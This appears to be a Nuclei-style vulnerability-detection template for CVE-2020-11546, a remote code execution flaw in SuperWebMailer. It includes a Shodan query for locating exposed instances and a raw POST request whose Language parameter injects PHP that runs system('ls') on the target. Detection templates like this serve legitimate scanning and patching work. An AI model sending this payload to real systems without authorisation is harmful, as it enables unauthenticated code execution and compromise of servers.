id: CVE-2020-11546
info:
  name: SuperWebmailer 7.21.0.01526 - Remote Code Execution
  author: Official_BlackHat13
  severity: critical
  description: SuperWebMailer 7.21.0.01526 has a remote code execution vulnerability
    in the Language parameter of mailingupgrade.php, allowing an unauthenticated attacker
    to execute arbitrary PHP code through code injection.
  reference:
  - https://github.com/Official-BlackHat13/CVE-2020-11546/
  - https://blog.to.com/advisory-superwebmailer-cve-2020-11546/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-11546
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-11546
    cwe-id: CWE-94
  metadata:
    shodan-query: title:"SuperWebMailer"
    impact: The remote code execution vulnerability in SuperWebMailer 7.21.0.01526
      could result in arbitrary PHP code being executed by an unauthenticated remote
      attacker, potentially having a significant impact on the affected system.
    recommendation: It is recommended to update SuperWebMailer to the latest version
      to prevent remote code execution vulnerability.
  tags: cve,cve2020,rce,superwebmailer
requests:
- raw:
  - 'POST /mailingupgrade.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    step=1&Language=de{${system("ls")}}&NextBtn=Weiter+%3E

    '
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - ajax_ccea.php
    - ajax_getemailingactions.php
    - ajax_getemailtemplates.php
    condition: and
